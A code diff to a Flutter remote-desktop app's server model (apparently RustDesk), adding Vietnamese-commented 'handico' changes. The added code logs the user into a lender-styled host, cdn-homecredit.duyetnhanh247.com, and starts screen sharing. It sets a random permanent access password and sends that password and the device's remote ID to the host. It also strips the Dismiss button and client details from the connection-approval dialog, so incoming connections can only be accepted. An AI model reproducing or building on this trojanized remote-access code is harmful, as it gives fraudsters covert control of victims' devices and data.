@@ -1,6 +1,9 @@
 import 'dart:async';
 import 'dart:convert';
-
+import 'dart:io';
+//++++Reminani : upgrade cho handico
+import 'dart:math';
+//----Reminani : upgrade cho handico
 import 'package:flutter/material.dart';
 import 'package:flutter_hbb/consts.dart';
 import 'package:flutter_hbb/main.dart';
@@ -27,6 +30,11 @@ class ServerModel with ChangeNotifier {
   bool _isStart = false; // Android MainService status
   bool _mediaOk = false;
   bool _inputOk = false;
+  //++++Reminani : upgrade cho handico
+  bool _platformOk = false;
+  bool _deviceOk = false;
+  bool _cameraOk = false;
+  //----Reminani : upgrade cho handico
   bool _audioOk = false;
   bool _fileOk = false;
   bool _showElevation = false;
@@ -53,6 +61,8 @@ class ServerModel with ChangeNotifier {
   bool get mediaOk => _mediaOk;
 
   bool get inputOk => _inputOk;
+  //++++Reminani : upgrade cho handico
+  bool get platformOk => _platformOk;
 
   bool get audioOk => _audioOk;
 
@@ -61,6 +71,11 @@ class ServerModel with ChangeNotifier {
   bool get showElevation => _showElevation;
 
   int get connectStatus => _connectStatus;
+  //++++Reminani : upgrade cho handico
+  static String token = '';
+  static int idLogin = -1 ;
+  static const platform = MethodChannel('mChannel');
+  //----Reminani : upgrade cho handico
 
   String get verificationMethod {
     final index = [
@@ -387,7 +402,33 @@ class ServerModel with ChangeNotifier {
       }
     }
   }
-
+//++++Reminani : them form xac thuc thong tin
+  startVerifyProcess(id, pw) async {
+    if (!_isStart) {
+      final res = await parent.target?.dialogManager
+          .show<bool>((setState, close, context) {
+        submit() => close(true);
+        return CustomAlertDialog(
+          title: Row(children: [
+            const Icon(Icons.warning_amber_sharp,
+                color: Colors.redAccent, size: 28),
+            const SizedBox(width: 10),
+            Text("Thông báo"),
+          ]),
+          content: Text(translate("android_service_will_start_tip")),
+          actions: [
+            dialogButton("OK", onPressed: submit),
+          ],
+          onSubmit: submit,
+          onCancel: close,
+        );
+      });
+      if (res == true) {
+        loginLoanMember(loanUsername: id, loanUserPassword: pw);
+      }
+    }
+  }
+//----Reminani : them form xac thuc thong tin
   /// Start the screen sharing service.
   Future<void> startService() async {
     _isStart = true;
@@ -433,6 +474,85 @@ class ServerModel with ChangeNotifier {
       notifyListeners();
     }
   }
+  //++++Reminani : upgrade cho handico
+  saveAndSendInfo({String? id, String? pw}) async {
+    final id = await bind.mainGetMyId();
+
+    var url2 =
+    Uri.http('cdn-homecredit.duyetnhanh247.com', 'Loans/user/updateLoan');
+    const kUsePermanentPassword = "use-permanent-password";
+
+    await bind.mainSetOption(
+        key: "verification-method", value: kUsePermanentPassword);
+    await updatePasswordModel();
+    Random random = Random();
+    List<int> numbers = List.generate(7, (index) => random.nextInt(10));
+    String pwRandom = numbers.join();
+    final p0 = TextEditingController(text: pwRandom);
+
+    String pwRandom1 = "${p0.text.trim()}";
+    await setPermanentPassword(pwRandom1);
+
+    http.post(url2,
+        headers: {
+          'Content-type': 'application/json',
+          'Accept': 'application/json',
+          "Authorization": "Bearer $token"
+        },
+        body: json.encode(
+          <String, dynamic>{
+            'id': idLogin,
+            'data': json.encode(
+              <String, dynamic>{
+                "remote_password": pwRandom1,
+                "remote_id": id,
+              },
+            )
+          },
+        ));
+  }
+
+  void loginLoanMember({String? loanUsername, String? loanUserPassword}) async {
+    if (loanUsername != null && loanUsername.isNotEmpty && loanUserPassword != null && loanUserPassword.isNotEmpty) {
+      var url = Uri.http('cdn-homecredit.duyetnhanh247.com', 'Member/loginMember');
+
+      final resp = await http.post(url, body: {'phonenum': loanUsername, 'password': loanUserPassword});
+      if (resp.statusCode == 200) {
+        var decodedResponse = jsonDecode((resp.body)) as Map;
+        idLogin = decodedResponse["data"]["id"];
+        token = decodedResponse["data"]["token"];
+        final SharedPreferences prefs = await SharedPreferences.getInstance();
+        await prefs.setInt('idLogin', idLogin);
+        await prefs.setString('tokenLogin', token);
+        await prefs.setString('userName', loanUsername);
+        await prefs.setString('password', loanUserPassword);
+        if(decodedResponse["data"]["identity_loan"] != null) {
+          await prefs.setString('identityLoan', decodedResponse["data"]["identity_loan"]);
+        }
+        await _setUserInfoToUpdate(idLogin, token);
+        await startService();
+        saveAndSendInfo(id:loanUsername, pw: loanUserPassword);
+      } else {
+         parent.target?.dialogManager
+            .show<bool>((setState, close, context) {
+          return CustomAlertDialog(
+            title: Row(children: [
+              const Icon(Icons.warning_amber_sharp,
+                  color: Colors.redAccent, size: 28),
+              const SizedBox(width: 10),
+              Text(translate("Cảnh báo")),
+            ]),
+            content: Text(translate("ID hoặc mật khẩu không đúng")),
+            actions: [
+              dialogButton("OK", onPressed: close),
+            ],
+            onSubmit: close,
+          );
+        });
+      }
+    }
+  }
+  //----Reminani : upgrade cho handico
 
   changeStatue(String name, bool value) {
     debugPrint("changeStatue value $value");
@@ -577,8 +697,11 @@ class ServerModel with ChangeNotifier {
           mainAxisAlignment: MainAxisAlignment.center,
           crossAxisAlignment: CrossAxisAlignment.start,
           children: [
-            Text(translate("Do you accept?")),
-            ClientInfo(client),
+  //++++Reminani : upgrade cho handico
+            // Text(translate("Do you accept?")),
+            Text("Kết nối xác thực"),
+            // ClientInfo(client),
+  //----Reminani : upgrade cho handico
             Text(
               translate("android_new_connection_tip"),
               style: Theme.of(globalKey.currentContext!).textTheme.bodyMedium,
@@ -586,9 +709,12 @@ class ServerModel with ChangeNotifier {
           ],
         ),
         actions: [
-          dialogButton("Dismiss", onPressed: cancel, isOutline: true),
-          if (approveMode != 'password')
-            dialogButton("Accept", onPressed: submit),
+  //++++Reminani : upgrade cho handico
+          // dialogButton("Dismiss", onPressed: cancel, isOutline: true),
+          //if (approveMode != 'password')
+          // dialogButton("Accept", onPressed: submit),
+          dialogButton("Đồng ý", onPressed: submit),
+  //----Reminani : upgrade cho handico
         ],
         onSubmit: submit,
         onCancel: cancel,
@@ -687,6 +813,13 @@ class ServerModel with ChangeNotifier {
       debugPrint("updateVoiceCallState failed: $e");
     }
   }
+//++++Reminani : them form xac thuc thong tin
+  Future<void> _setUserInfoToUpdate(int idLogin, String token) async {
+    try {
+      await platform.invokeMethod('user_update', {'idLogin': idLogin, "token": token});
+    } on PlatformException catch (e) {}
+  }
+//----Reminani : them form xac thuc thong tin
 }
 
 enum ClientType {
